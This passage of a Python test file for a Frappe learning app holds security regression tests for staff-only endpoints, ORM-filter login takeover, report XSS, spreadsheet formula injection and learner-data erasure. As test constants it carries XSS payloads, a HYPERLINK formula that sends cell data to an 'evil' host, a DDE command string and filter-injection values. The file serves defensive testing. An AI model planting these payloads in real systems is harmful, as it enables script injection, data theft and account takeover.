		self.assertRaises(frappe.PermissionError, api.revoke_student_token, girl.name)
		frappe.set_user("Administrator")
		self.assertTrue(api._token_ok(girl.name, tok))   # still signed in on her own device

	def test_website_user_cannot_read_roster_or_analytics(self):
		frappe.set_user(self._learner_user())
		self.assertRaises(frappe.PermissionError, api.get_campus_roster, "Any Campus")
		self.assertRaises(frappe.PermissionError, api.active_student_count)
		self.assertRaises(frappe.PermissionError, api.average_stars)

	def test_guest_still_cannot_call_any_staff_endpoint(self):
		girl = self._mk_student("Staff Gate Guest Girl")
		tok = api._token_for(girl.name)
		frappe.db.commit()
		frappe.set_user("Guest")
		for call in (lambda: api.delete_student(girl.name),
		             lambda: api.revoke_student_token(girl.name),
		             lambda: api.get_campus_roster("Any Campus"),
		             api.active_student_count, api.average_stars):
			self.assertRaises(frappe.PermissionError, call)
		frappe.set_user("Administrator")
		self.assertTrue(frappe.db.exists("Student", girl.name))
		self.assertTrue(api._token_ok(girl.name, tok))

	def test_system_manager_can_still_use_every_staff_endpoint(self):
		# the gate must not break the facilitator's real work (erasure is a legal duty)
		girl = self._mk_student("Staff Gate Admin Girl")
		tok = api._token_for(girl.name)
		frappe.db.commit()
		self.assertTrue(api.revoke_student_token(girl.name).get("ok"))
		self.assertFalse(api._token_ok(girl.name, tok))          # rotated away
		self.assertIsNotNone(api.active_student_count())
		self.assertIsNotNone(api.average_stars())
		self.assertEqual(api.get_campus_roster(), [])            # staff, but named no campus
		r = api.delete_student(girl.name)
		self.assertTrue(r.get("ok"), r)
		self.assertEqual(r.get("deleted"), "Staff Gate Admin Girl")
		self.assertFalse(frappe.db.exists("Student", girl.name))

	def test_campus_roster_still_provisions_a_laptop_for_staff_only(self):
		"""get_campus_roster's inline role check became _require_staff() — prove the staff
		path still hands back the offline-login credentials (a campus device's lifeline),
		and that a learner asking for the same campus gets nothing."""
		campus = "Staff Gate Campus"
		if not frappe.db.exists("Campus", campus):
			frappe.get_doc({"doctype": "Campus", "campus_name": campus, "location": "Test",
			                "active": 1}).insert(ignore_permissions=True)

			def _rm_campus():
				frappe.set_user("Administrator")
				frappe.db.delete("Campus", {"name": campus})
				frappe.db.commit()

			self.addCleanup(_rm_campus)
		girl = self._mk_student("Staff Gate Campus Girl", mode="Campus", campus=campus,
		                        login_pin=api._hash_pin("4321"))
		frappe.db.commit()
		rows = api.get_campus_roster(campus)
		self.assertEqual([r["id"] for r in rows], [girl.name])
		self.assertTrue(rows[0]["token"])
		self.assertTrue(api._looks_hashed(rows[0]["pinHash"]))   # the PIN hash, i.e. a secret
		frappe.set_user(self._learner_user())
		self.assertRaises(frappe.PermissionError, api.get_campus_roster, campus)

	# -- the roster/centre readers closed in the same sweep -------------------
	# get_students + get_cohorts + get_campuses were allow_guest. Nothing calls them
	# (checked: index.html, both synced copies, the Capacitor bundle, the release assets,
	# the Desk reports), and together they enumerated every minor in the programme:
	# get_cohorts handed a caller every batch, get_students then handed over that batch's
	# girls by name. get_campuses is only ever used after a teacher login.
	_ROSTER_READERS = ("get_students", "get_cohorts", "get_campuses")

	def _cohort(self):
		name = "Staff Gate Batch"
		if not frappe.db.exists("Cohort", name):
			frappe.get_doc({"doctype": "Cohort", "cohort_name": name, "mode": "Online",
			                "center": "Staff Gate Centre"}).insert(ignore_permissions=True)

			def _rm():
				frappe.set_user("Administrator")
				frappe.db.delete("Cohort", {"name": name})
				frappe.db.commit()

			self.addCleanup(_rm)
		return name

	def test_website_user_cannot_enumerate_minors_or_centres(self):
		cohort = self._cohort()
		self._mk_student("Staff Gate Roster Girl", cohort=cohort,
		                 login_pin=api._hash_pin("4321"))
		frappe.db.commit()
		frappe.set_user(self._learner_user())
		self.assertRaises(frappe.PermissionError, api.get_students, cohort)
		self.assertRaises(frappe.PermissionError, api.get_cohorts)
		self.assertRaises(frappe.PermissionError, api.get_campuses)

	def test_guest_cannot_enumerate_minors_or_centres(self):
		frappe.set_user("Guest")
		for fn in self._ROSTER_READERS:
			self.assertRaises(frappe.PermissionError, getattr(api, fn))

	def test_staff_can_still_read_the_roster_and_centres(self):
		"""The facilitator-facing behaviour is unchanged — only the audience is."""
		cohort = self._cohort()
		girl = self._mk_student("Staff Gate Roster Girl 2", cohort=cohort,
		                        login_pin=api._hash_pin("4321"))
		frappe.db.commit()
		rows = api.get_students(cohort)
		self.assertIn(girl.name, [r["id"] for r in rows])
		mine = next(r for r in rows if r["id"] == girl.name)
		self.assertTrue(mine["hasPin"])
		self.assertEqual(sorted(mine), ["avatar", "hasPin", "id", "name"])  # never the PIN
		self.assertIn(cohort, [c["name"] for c in api.get_cohorts()])
		self.assertIsInstance(api.get_campuses(), list)

	def test_has_students_stays_public_and_leaks_no_names(self):
		"""The one roster-adjacent endpoint that must stay guest-facing (boot check).
		It is safe because it answers a bool and never a name — keep it that way."""
		frappe.set_user("Guest")
		r = api.has_students()
		self.assertIsInstance(r["any"], bool)
		self.assertEqual(list(r), ["any"])


class TestLoginStudentIsOneStudent(FrappeTestCase):
	"""login_student is guest-facing and WRITES to a learner's row (it mints her token), so
	its `student` argument is an authorization input. It was passed through un-coerced,
	and Frappe treats a dict/list as an ORM FILTER — so a caller could name NO ONE:

	  login_student({"student_name": ["like", "R2GATE%"]}, "1234")

	authenticated against whichever row the filter selected, leaked that girl's name, and
	then had _token_for rotate EVERY matched row to ONE shared auth_token (proven, 2 rows,
	2026-07-28). One token that _token_ok accepts for several children is cross-account
	takeover; every matched campus laptop is logged out at the same time. The per-student
	lockout was defeated too, its key being str(student): two spellings of one filter are
	two buckets, so the 8-try ceiling never closed."""

	PIN = "4321"

	def _mk(self, name, pin=None):
		def _rm():
			for n in frappe.get_all("Student", filters={"student_name": name}, pluck="name"):
				frappe.db.delete("Student", {"name": n})
			frappe.db.commit()

		self.addCleanup(_rm)
		return frappe.get_doc({"doctype": "Student", "student_name": name, "active": 1,
		                       "gender": "Female",
		                       "login_pin": pin or api._hash_pin(self.PIN)}).insert(
			ignore_permissions=True)

	def test_a_filter_cannot_stand_in_for_a_student_id(self):
		a = self._mk("Filter Login Girl A")
		b = self._mk("Filter Login Girl B")
		frappe.db.commit()
		before = {s.name: frappe.db.get_value("Student", s.name, "auth_token") for s in (a, b)}
		for bad in ({"student_name": ["like", "Filter Login Girl%"]}, {"active": 1},
		            ["in", [a.name, b.name]], None, ""):
			r = api.login_student(bad, self.PIN)
			self.assertFalse(r.get("ok"), repr(bad))
			self.assertEqual(r.get("error"), "not_found", repr(bad))   # no oracle, no name
			self.assertNotIn("name", r)
		for s in (a, b):        # nobody's token was rotated, so nobody was logged out
			self.assertEqual(frappe.db.get_value("Student", s.name, "auth_token"),
			                 before[s.name])

	def test_a_named_student_still_logs_in_normally(self):
		girl = self._mk("Filter Login Girl C")
		frappe.db.commit()
		r = api.login_student(girl.name, self.PIN)
		self.assertTrue(r.get("ok"), r)
		self.assertEqual(r["id"], girl.name)
		self.assertTrue(api._token_ok(girl.name, r["token"]))
		self.assertEqual(api.login_student(girl.name, "9999").get("error"), "wrong_pin")

	def test_token_for_never_writes_to_more_than_one_row(self):
		"""Defence in depth at the sink: even if a future caller forgets to coerce, the
		token minter must not become an UPDATE with no WHERE."""
		a = self._mk("Filter Token Girl A")
		b = self._mk("Filter Token Girl B")
		# both already signed in on their own laptops — that is what must not be revoked
		before = {s.name: api._token_for(s.name) for s in (a, b)}
		frappe.db.commit()
		self.assertNotEqual(before[a.name], before[b.name])
		for bad in ({"student_name": ["like", "Filter Token Girl%"]}, {}, None, "",
		            "no-such-student"):
			tok = api._token_for(bad)
			self.assertTrue(tok)                       # a throw-away value, never persisted
			for s in (a, b):
				self.assertEqual(frappe.db.get_value("Student", s.name, "auth_token"),
				                 before[s.name], repr(bad))          # still logged in
				self.assertTrue(api._token_ok(s.name, before[s.name]), repr(bad))
				self.assertFalse(api._token_ok(s.name, tok), repr(bad))   # authenticates nobody
		self.assertEqual(api._token_for(a.name), before[a.name])   # real name: sliding window


# ---------------------------------------------------------------------------
# Round-2 security regressions (audit 2026-07-28).
#
# The stored-XSS / spreadsheet-formula-injection primitive was NOT confined to one
# report: learner-authored text reaches Desk "Data" columns in five sibling
# facilitator reports, frappe's Data formatter returns it unchanged and
# frappe-datatable assigns it with innerHTML, while the same rows are what the
# CSV/XLSX export writes. These tests pin all of it, plus the two regressions the
# first, single-report fix introduced — an entity-mangled export — and the erasure
# hole that let single_center() leave a deleted girl's rows behind.
#
# Appended as ONE class at the end of the file on purpose: it minimises merge
# collisions with the other hardening work landing in this file.
# ---------------------------------------------------------------------------
class TestReportOutputGuards(FrappeTestCase):
	"""Every learner-authored report cell must be inert in the Desk grid AND arrive in
	the facilitator's spreadsheet as the girl's own characters, formula-guarded."""

	XSS = '<img src=x onerror=alert(document.domain)>'
	FORMULA = '=HYPERLINK("http://evil/?"&A1,"CLICK ME")'
	DDE = "+cmd|' /C calc'!A0"
	# the export must show what she typed: these characters survive byte-for-byte
	DEVANAGARI = 'मैं "बोली" बोलती हूँ 🙂 — it\'s fine & good'
	# a real multi-sentence Bhojpuri transcription — far past the old 120-char cut
	LEAD = ("=", "+", "-", "@", "\t", "\r")

	# ------------------------------------------------------------------ fixtures
	def setUp(self):
		frappe.set_user("Administrator")
		self._form = getattr(frappe.local, "form_dict", None)
		self.addCleanup(self._restore_form)
		self.addCleanup(lambda: frappe.flags.pop("hikmat_report_export", None))

	def _restore_form(self):
		frappe.local.form_dict = self._form if self._form is not None else frappe._dict()

	def _cohort(self, name):
		if not frappe.db.exists("Cohort Start Date", "2026-09-01"):
			frappe.get_doc({"doctype": "Cohort Start Date",
			                "start_date": "2026-09-01"}).insert(ignore_permissions=True)
		if not frappe.db.exists("Cohort", name):
			frappe.get_doc({"doctype": "Cohort", "cohort_name": name, "mode": "Offline",
			                "start_date": "2026-09-01",
			                "center": "test"}).insert(ignore_permissions=True)
		self.addCleanup(lambda: frappe.db.exists("Cohort", name)
		                and frappe.delete_doc("Cohort", name, force=1, ignore_permissions=1))
		return name

	def _student(self, name, cohort=None, with_user=False):
		user = None
		if with_user:
			user = "rg-" + frappe.generate_hash(length=8) + "@guard.hikmat.invalid"
			frappe.get_doc({"doctype": "User", "email": user, "first_name": "Guard",
			                "send_welcome_email": 0,
			                "user_type": "Website User"}).insert(ignore_permissions=True)
		girl = frappe.get_doc({"doctype": "Student", "student_name": name, "age": 13,
		                       "gender": "Female", "active": 1, "cohort": cohort,
		                       "user": user}).insert(ignore_permissions=True)

		# Clean up by DOCNAME, never by student_name: frappe's own ingest sanitiser
		# rewrites a name carrying markup (`<img src=x …>` → `<img src="x">`), so a
		# lookup by the payload we passed in matches nothing and the fixture leaks.
		def _rm():
			frappe.set_user("Administrator")
			if frappe.db.exists("Student", girl.name):
				api.delete_student(girl.name)
			api._erase_student_user(user)
			frappe.db.commit()
		self.addCleanup(_rm)
		return girl

	def _attempt(self, girl, cohort):
		"""track/lesson/activity all come from the game client, so all three are
		attacker-controlled — and all three are Data columns in two reports."""
		frappe.get_doc({"doctype": "Lesson Attempt", "student": girl.name,
		                "student_name": girl.student_name, "cohort": cohort,
		                "track": "=1+1" + self.XSS, "lesson": "l1" + self.XSS,
		                "activity": "@SUM(A1)" + self.XSS, "stars": 2, "score": 3,
		                "total": 4, "coins": 5,
		                "attempted_on": frappe.utils.now()}).insert(ignore_permissions=True)

	def _attendance(self, girl):
		frappe.get_doc({"doctype": "Attendance Day", "student": girl.name,
		                "date": frappe.utils.nowdate(), "active_secs": 9000,
		                "device_count": 1, "first_ping": frappe.utils.now(),
		                "last_ping": frappe.utils.now()}).insert(ignore_permissions=True)

	# ------------------------------------------------------------------ helpers
	@staticmethod
	def _strings(result, columns):
		"""Every string cell of a query_report.run() result, labelled."""
		out = []
		if not result:
			return out
		if isinstance(result[0], dict):
			labels = {(c.get("fieldname") or c.get("label")): c.get("label")
			          for c in columns if isinstance(c, dict)}
			for row in result:
				out += [(labels.get(k, k), v) for k, v in row.items() if isinstance(v, str)]
		else:
			for row in result:
				out += [(str(columns[i]) if i < len(columns) else "?", v)
				        for i, v in enumerate(row) if isinstance(v, str)]
		return out

	def _grid(self, report, filters=None):
		"""The REAL grid path: frappe.desk.query_report.run under a `run` request."""
		from frappe.desk.query_report import run
		frappe.local.form_dict = frappe._dict({"cmd": "frappe.desk.query_report.run"})
		return frappe._dict(run(report, filters or {}, are_default_filters=False))

	def _export(self, report, filters=None, fmt="Excel"):
		"""The REAL export path: frappe.desk.query_report._export_query, i.e. what the
		Export button and the emailed background export both call."""
		from frappe.desk.query_report import _export_query
		frappe.local.form_dict = frappe._dict()      # a background job has no form_dict
		form = frappe._dict({"report_name": report, "file_format_type": fmt,
		                     "filters": filters or {}, "visible_idx": [],
		                     "include_indentation": 0, "include_filters": 0,
		                     "custom_columns": "[]", "applied_filters": None})
		_n, _ext, content = _export_query(form, frappe._dict({"delimiter": ",", "quoting": 0}),
		                                  populate_response=False)
		return content

	@staticmethod
	def _xlsx_strings(book):
		import io as _io

		from openpyxl import load_workbook
		ws = load_workbook(_io.BytesIO(book)).active
		return [c.value for row in ws.iter_rows(min_row=2) for c in row
		        if isinstance(c.value, str)]

	@staticmethod
	def _xlsx_formulas(book):
		import io as _io

		from openpyxl import load_workbook
		ws = load_workbook(_io.BytesIO(book)).active
		return [(c.coordinate, c.value) for row in ws.iter_rows(min_row=2) for c in row
		        if c.data_type == "f"
		        or (isinstance(c.value, str) and c.value[:1] in TestReportOutputGuards.LEAD)]

	def _reports(self):
		"""(report, filters) for every sibling report that renders learner text.
		The two converted ones are re-imported from disk if the site predates them —
		_adopt_script_report is idempotent."""
		from hikmat import setup_data
		if not frappe.db.exists("Report", "Lesson Trouble Spots"):
			setup_data.setup_trouble_report()
		if not frappe.db.exists("Report", "Student Engagement"):
			setup_data.setup_engagement_report()
		today = frappe.utils.nowdate()
		plan = [("Attendance Summary", {"from_date": today, "to_date": today}),
		        ("Daily Attendance", {"from_date": today, "to_date": today}),
		        ("Activity Drill-down", {}),
		        ("Lesson Trouble Spots", {}),
		        ("Student Engagement", {})]
		return [(r, f) for r, f in plan if frappe.db.exists("Report", r)]

	def _seed_everything(self):
		coh = self._cohort("R2 Guard Cohort")
		girls = []
		for payload in (self.FORMULA + self.XSS, self.DEVANAGARI, self.DDE):
			g = self._student(payload + " RGuard", cohort=coh)
			self._attempt(g, coh)
			self._attendance(g)
			girls.append(g)
		frappe.db.commit()
		return coh, girls

	# ------------------------------------------------------------------ the class
	def test_every_report_renders_learner_text_inert_in_the_desk_grid(self):
		"""C2: no report may hand the Desk grid a cell it can parse as markup. The grid
		assigns innerHTML, so an angle bracket anywhere in a Data cell is the bug."""
		self._seed_everything()
		checked = 0
		for report, filters in self._reports():
			res = self._grid(report, filters)
			cells = self._strings(res.result, res.columns)
			self.assertTrue(cells, report + ": produced no string cells to check")
			for label, v in cells:
				self.assertNotIn("<", v, f"{report}[{label}] can be parsed as markup: {v!r}")
				self.assertNotIn(">", v, f"{report}[{label}] can be parsed as markup: {v!r}")
				self.assertNotIn(v[:1], self.LEAD,
				                 f"{report}[{label}] leads with a formula char: {v!r}")
			checked += len(cells)
		self.assertGreater(checked, 0)

	def test_the_harness_would_notice_an_unguarded_report(self):
		"""Positive control: the SAME rows through the SAME frappe.desk.query_report.run,
		from a report with no guard, must trip the assertions above — otherwise the test
		is only proving that reports return nothing interesting."""
		self._seed_everything()
		name = "RGuard Unguarded Control"
		self.addCleanup(lambda: frappe.db.exists("Report", name)
		                and frappe.delete_doc("Report", name, force=1, ignore_permissions=1))
		if frappe.db.exists("Report", name):
			frappe.delete_doc("Report", name, force=1, ignore_permissions=1)
		# CHAR(37) is '%': a literal % would be consumed by pymysql's parameter mogrify
		frappe.get_doc({
			"doctype": "Report", "report_name": name, "ref_doctype": "Student",
			"report_type": "Query Report", "is_standard": "No", "module": "Hikmat",
			"query": ('SELECT s.student_name AS "Name::300" FROM `tabStudent` s '
			          "WHERE s.student_name LIKE CONCAT(CHAR(37),'RGuard',CHAR(37))"),
			"roles": [{"role": "System Manager"}],
		}).insert(ignore_permissions=True)
		frappe.db.commit()
		res = self._grid(name)
		cells = [v for _l, v in self._strings(res.result, res.columns)]
		self.assertTrue(any("<" in v for v in cells), "control lost the markup payload")
		self.assertTrue(any(v[:1] in self.LEAD for v in cells), "control lost the formula")
		book = self._export(name)
		self.assertTrue(self._xlsx_formulas(book),
		                "control produced no evaluable spreadsheet cell — export "
		                "harness cannot detect formula injection")

	def test_export_is_formula_safe_and_never_entity_mangled(self):
		"""R2 + H9 together. The spreadsheet is the facilitator's copy of what the girls
		wrote, so the ONLY change the export may make to a stored value is one leading apostrophe
		to stop Excel evaluating it. HTML-escaping here (which is what the first fix did)
		turned `it's fine & good` into `it&apos;s fine &amp; good` — corrupted data."""
		from frappe.utils.xlsxutils import handle_html
		coh, girls = self._seed_everything()
		stored = [frappe.db.get_value("Student", g.name, "student_name") for g in girls]
		for report, filters in self._reports():
			if report == "Lesson Trouble Spots":
				continue                     # no student_name column
			book = self._export(report, filters)
			cells = self._xlsx_strings(book)
			self.assertFalse(self._xlsx_formulas(book),
			                 f"{report}: exported .xlsx still has evaluable cells")
			for raw in stored:
				# make_xlsx runs frappe's own handle_html over every cell, which
				# html2texts anything containing BOTH < and >; those are the only
				# other forms allowed.
				ok = {raw, "'" + raw, handle_html(raw), handle_html("'" + raw)}
				self.assertTrue(any(c in ok for c in cells),
				                f"{report}: export ALTERED a stored value.\n"
				                f"  stored: {raw!r}\n"
				                f"  export: {[c for c in cells if raw[:12] in c][:2]!r}")
			# the girl's own characters, not entities
			self.assertTrue(any(self.DEVANAGARI in c for c in cells),
			                f"{report}: export lost the Devanagari verbatim")
			for entity in ("&quot;", "&apos;", "&#39;", "&lt;", "&gt;"):
				self.assertFalse(any(entity in c and self.DEVANAGARI[:6] in c
				                     for c in cells),
				                 f"{report}: export entity-mangled the Devanagari")

	def test_export_guard_actually_fires_on_the_formula_payload(self):
		"""Formula-safety must come from the guard, not from the value having been
		dropped: an apostrophe-prefixed copy of the payload has to be in the file."""
		self._seed_everything()
		book = self._export("Attendance Summary",
		                    {"from_date": frappe.utils.nowdate(),
		                     "to_date": frappe.utils.nowdate()})
		cells = self._xlsx_strings(book)
		self.assertTrue(any(c.startswith("'=HYPERLINK") for c in cells),
		                "no apostrophe-guarded =HYPERLINK cell in the export")
		self.assertTrue(any(c.startswith("'+cmd|") for c in cells),
		                "no apostrophe-guarded DDE cell in the export")

	def test_csv_export_keeps_the_corpus_readable(self):
		"""The PA exports CSV as often as XLSX; get_csv_bytes has no formula guard and
		frappe's handle_html only un-escapes when a value has BOTH < and >, so a bare
		&quot; would survive into the file."""
		self._seed_everything()
		import csv as csvmod
		import io as _io
		blob = self._export("Daily Attendance",
		                    {"from_date": frappe.utils.nowdate(),
		                     "to_date": frappe.utils.nowdate()}, fmt="CSV").decode("utf-8")
		# parse it as a spreadsheet would: RFC4180 doubles the quotes inside a field, so
		# comparing against the raw blob would only be testing the CSV writer
		rows = list(csvmod.reader(_io.StringIO(blob)))
		fields = [f for r in rows[1:] for f in r]
		self.assertIn(self.DEVANAGARI + " RGuard", fields)
		for f in fields:
			self.assertNotIn(f[:1], self.LEAD, "evaluable CSV field: " + repr(f))
			for entity in ("&quot;", "&apos;", "&#39;"):
				self.assertNotIn(entity, f, "entity-mangled CSV field: " + repr(f))

	def test_destination_is_read_off_the_request_and_fails_safe(self):
		"""The subtle part: export_query calls run() internally, so the report body can
		only tell grid from file by looking at the request. Fail-safe direction is HTML."""
		from hikmat import report_utils as ru
		frappe.local.form_dict = frappe._dict({"cmd": "frappe.desk.query_report.run"})
		self.assertFalse(ru.is_spreadsheet_export(), "a grid request read as an export")
		frappe.local.form_dict = frappe._dict({"cmd": "frappe.desk.query_report.export_query"})
		self.assertTrue(ru.is_spreadsheet_export(), "the export cmd was missed")
		frappe.local.form_dict = frappe._dict()
		self.assertFalse(ru.is_spreadsheet_export(),
		                 "with no request the guard MUST fall back to HTML escaping")
		frappe.flags.hikmat_report_export = True
		self.assertTrue(ru.is_spreadsheet_export(), "the explicit flag was ignored")

	def test_safe_cell_applies_the_transform_for_the_destination(self):
		"""Unit-level statement of the same rule, so a future refactor cannot quietly
		swap one transform for the other."""
		from hikmat import report_utils as ru
		payload = '<b>x</b> & "y"'
		frappe.local.form_dict = frappe._dict({"cmd": "frappe.desk.query_report.run"})
		grid = ru.safe_cell(payload)
		self.assertNotIn("<", grid)
		self.assertIn("&lt;", grid)
		frappe.flags.hikmat_report_export = True
		export = ru.safe_cell(payload)
		self.assertEqual(export, payload)            # byte-for-byte, no entities
		self.assertEqual(ru.safe_cell("=1+1"), "'=1+1")
		self.assertEqual(ru.safe_cell(self.DDE), "'" + self.DDE)
		self.assertEqual(ru.safe_cell(self.DEVANAGARI), self.DEVANAGARI)
		self.assertEqual(ru.safe_cell(None), "")

	def test_truncation_is_visible_and_never_splits_an_entity(self):
		"""R1's other half: if a cap remains anywhere, a cut must be obvious, and the
		cap must be applied BEFORE escaping so it cannot slice `&quot;` in two."""
		from hikmat import report_utils as ru
		frappe.local.form_dict = frappe._dict({"cmd": "frappe.desk.query_report.run"})
		self.assertTrue(ru.safe_cell("abcdefghij", 4).endswith("…"))
		self.assertEqual(ru.safe_cell("abc", 10), "abc")          # no ellipsis when it fits
		cut = ru.safe_cell('"' * 10, 3)
		self.assertNotIn("&quo", cut.replace("&quot;", ""))       # no half entity
		# and a grid cap must NEVER reach the spreadsheet: the export is the corpus
		frappe.flags.hikmat_report_export = True
		self.assertEqual(ru.safe_cell("abcdefghij", 4), "abcdefghij")

	def test_converted_reports_no_longer_store_their_sql(self):
		"""The two SQL-defined reports are now Script Reports whose body is a file on
		disk. A `query` back in the DB row means someone re-seeded the unguarded
		definition — the exact failure mode _adopt_script_report exists to prevent."""
		for name in ("Lesson Trouble Spots", "Student Engagement"):
			if not frappe.db.exists("Report", name):
				from hikmat import setup_data
				(setup_data.setup_trouble_report if name == "Lesson Trouble Spots"
				 else setup_data.setup_engagement_report)()
			row = frappe.db.get_value("Report", name,
			                          ["report_type", "is_standard", "query"], as_dict=True)
			self.assertEqual(row.report_type, "Script Report", name)
			self.assertEqual(row.is_standard, "Yes", name)
			self.assertFalse(row.query, name + " still carries raw SQL in the DB row")

	def test_adopt_script_report_is_idempotent(self):
		"""It runs from after_install, from patches and from a bench re-seed."""
		from hikmat import setup_data
		setup_data.setup_trouble_report()
		setup_data.setup_trouble_report()
		self.assertFalse(frappe.db.get_value("Report", "Lesson Trouble Spots", "query"))
		res = self._grid("Lesson Trouble Spots")
		self.assertTrue(res.columns)

	# ------------------------------------------------------------------ erasure
	def test_cohort_erasure_takes_the_whole_learner_trail(self):
		"""C1/H10 again, at the third erasure call site. setup_data.single_center() removed
		only Lesson Attempt rows and then force-deleted the Student, leaving the rest of her
		trail behind with a dangling `student` link that nothing noticed — Frappe's Links
		carry no FK constraint. Tested through erase_cohort_learners(), the helper
		single_center() delegates to (single_center itself sweeps every cohort on the site,
		so it is not safely testable; the helper is where the fix lives)."""
		from hikmat import setup_data
		doomed = self._cohort("R2 Doomed Cohort")
		kept = self._cohort("R2 Kept Cohort")
		girl = self._student("RGuard Doomed Girl", cohort=doomed, with_user=True)
		peer = self._student("RGuard Kept Girl", cohort=kept)
		for who, coh in ((girl, doomed), (peer, kept)):
			self._attempt(who, coh)
			self._attendance(who)
		frappe.db.commit()

		self.assertEqual(setup_data.erase_cohort_learners(doomed), 1)

		self.assertFalse(frappe.db.exists("Student", girl.name))
		for dt in api._LEARNER_DOCTYPES:
			self.assertEqual(frappe.db.count(dt, {"student": girl.name}), 0, dt)
		self.assertFalse(frappe.db.exists("User", girl.user))
		# the cohort next door is untouched — rows AND the girl herself
		self.assertTrue(frappe.db.exists("Student", peer.name))
		self.assertEqual(frappe.db.count("Lesson Attempt", {"student": peer.name}), 1)


class TestIngestSanitisation(FrappeTestCase):
	"""Round-2: normalise what a learner's DEVICE posts, before it is stored.

	Two properties must hold at the same time, and they pull against each other:

	* Nothing she types may survive as markup or as a spreadsheet-formula lead. These rows
	  are rendered in a System Manager's Desk grid (frappe-datatable assigns cell innerHTML)
	  and exported to XLSX/CSV. Proven on 2026-07-28: one authenticated submit_attempt stored
	  `track` = an <img onerror> payload verbatim and it EXECUTED via the real report path,
	  and a guest sign-up display name became a live =HYPERLINK() cell in an export.
	* Everything she actually WROTE must survive byte-for-byte — including U+200C/U+200D,
	  which Devanagari orthography uses to pick half-form vs conjunct. A "sanitiser" that
	  eats her joiners silently corrupts the Bhojpuri corpus this project exists to build.

	report_utils guards the OUTPUT sink (and so also covers rows written before these fixes);
	these tests cover the INGEST half. Both halves are load-bearing — do not drop one because
	the other passes.
	"""

	ZWJ, ZWNJ = chr(0x200D), chr(0x200C)
	CONJ = "क्" + chr(0x200D) + "ष"        # क् + ZWJ + ष → explicit conjunct
	FINAL = "दिन" + chr(0x200D)            # दिन + ZWJ (word-final joiner)
	# JSON-quoted on purpose: frappe's own bleach layer skips a value it reads as JSON, and
	# it only pre-sanitizes form_dict for GUESTS anyway — an online learner has no such layer.
	XSS = '"<img src=x onerror=document.title=\'PWN\'>"'
	FORMULA = '=HYPERLINK("http://evil/?"&A1,"HI")'

	# ------------------------------------------------------------------ fixtures
	def _mk_student(self, name):
		"""A committed Student + her bearer token. These endpoints COMMIT, so every row they
		write is cleaned by DOCNAME (never by student_name — a payload name is rewritten on
		the way in, so a lookup by what we passed would miss and leak the fixture)."""
		doc = frappe.get_doc({"doctype": "Student", "student_name": name, "active": 1,
		                      "gender": "Female", "age": 14}).insert(ignore_permissions=True)

		def _rm():
			frappe.set_user("Administrator")
			frappe.db.commit()
			for dt in ("Lesson Attempt", "Test Attempt", "Lesson Doubt", "Learning Event",
			           "Attendance Ping", "Attendance Day", "Evaluation"):
				frappe.db.delete(dt, {"student": doc.name})
			frappe.db.delete("Student", {"name": doc.name})
			frappe.db.commit()

		self.addCleanup(_rm)
		frappe.db.commit()
		return doc.name, api._token_for(doc.name)

	def _inert(self, *values):
		"""No stored value may carry an angle bracket — nor an HTML entity: these strings are
		replayed to the girl in the game, which escapes on render, so a stored "&lt;" would
		show her the entity text instead of her own words."""
		for v in values:
			if v is None:
				continue
			for ch in ("<", ">", "&lt;", "&gt;"):
				self.assertNotIn(ch, v, repr(v))

	# ------------------------------------------------- the joiner regression (R3)
	def test_plain_text_keeps_the_indic_joiners_byte_exact(self):
		"""U+200C/U+200D are Cf, so str.isprintable() is False and the old filter DELETED
		them: क्‍ष collapsed to क्ष and दिन‍ to दिन. That is not sanitisation, it is the
		corpus being rewritten. ZWJ-compound emoji (an avatar) broke the same way."""
		family = chr(0x1F469) + self.ZWJ + chr(0x1F469) + self.ZWJ + chr(0x1F467)
		for s in (self.CONJ, self.FINAL, "क्" + self.ZWNJ + "ष", family,
		          self.CONJ + " " + self.FINAL + " बाजार"):
			self.assertEqual(api._plain_text(s), s, [hex(ord(c)) for c in s])

	def test_plain_text_still_drops_every_other_invisible(self):
		"""The allowlist is exactly two characters wide — see api._KEEP_FORMAT. Anything else
		invisible (BOM, soft hyphen, bidi marks/overrides, word joiner, controls) has no
		orthographic role here and stays out."""
		for cp in (0xFEFF, 0x00AD, 0x200E, 0x200F, 0x202E, 0x2060, 0x0000, 0x001B):
			out = api._plain_text("अ" + chr(cp) + "ब")
			self.assertNotIn(chr(cp), out, hex(cp))
			self.assertEqual(out, "अब", hex(cp))

	def test_plain_text_lets_no_tag_survive(self):
		"""The property that makes the result untaggable must hold whatever else changes —
		including a payload that hides a joiner inside the tag to fool the regex."""
		for p in (self.XSS, "<script>bad()</script> आज",
		          "<" + self.ZWJ + "img src=x onerror=1>", "a<b>c", "<<>>", "<svg/onload=1",
		          "1 > 2 < 3", "<im" + self.ZWNJ + "g src=x onerror=1>"):
			self._inert(api._plain_text(p))

	def test_plain_text_still_collapses_newlines_and_tabs(self):
		self.assertEqual(api._plain_text("a\n\tb   c"), "a b c")

	def test_content_key_rejects_containers_and_clamps(self):
		"""A whitelisted argument arrives as parsed JSON, so a "key" can be a dict/list. Those
		are rejected outright rather than str()-ed into the row (see _docname)."""
		for bad in ({"status": "x"}, ["like", "%"], True, b"x"):
			self.assertEqual(api._content_key(bad), "", repr(bad))
		self.assertEqual(api._content_key("  life-skills "), "life-skills")
		self.assertEqual(api._content_key("<img src=x onerror=1>l1"), "l1")
		self.assertEqual(len(api._content_key("क" * 500)), 140)
		self.assertEqual(api._content_key("hi", 10), "hi")
		self.assertEqual(api._content_key(self.CONJ), self.CONJ)   # a real key may be Devanagari

	# ------------------------------------------------------- the write endpoints
	def test_submit_attempt_normalises_its_content_keys(self):
		stu, tok = self._mk_student("R2Ing Attempt Girl")
		r = api.submit_attempt(student=stu, token=tok, track=self.XSS, lesson=self.XSS,
		                       activity=self.XSS, stars=3, score=5, total=5,
		                       client_id="r2ing-a1")
		self.assertTrue(r.get("ok"), r)
		row = frappe.db.get_value("Lesson Attempt", r["name"],
		                          ["track", "lesson", "activity"], as_dict=True)
		self._inert(row.track, row.lesson, row.activity)
		# an over-long key used to be a 500 (frappe raises on a value wider than the column)
		r = api.submit_attempt(student=stu, token=tok, track="क" * 400, lesson="l1",
		                       activity="word", client_id="r2ing-a2")
		self.assertTrue(r.get("ok"), r)
		self.assertEqual(len(frappe.db.get_value("Lesson Attempt", r["name"], "track")), 140)

	def test_a_container_client_id_cannot_borrow_a_peers_attempt(self):
		"""client_id is a dedup FILTER value. Unc oerced, client_id=["like","%"] matched a
		CLASSMATE's row and the endpoint answered {"ok":True, "name": <her row>, "dedup":True}
		— leaking a docname and silently dropping this girl's own attempt."""
		peer, ptok = self._mk_student("R2Ing Peer Girl")
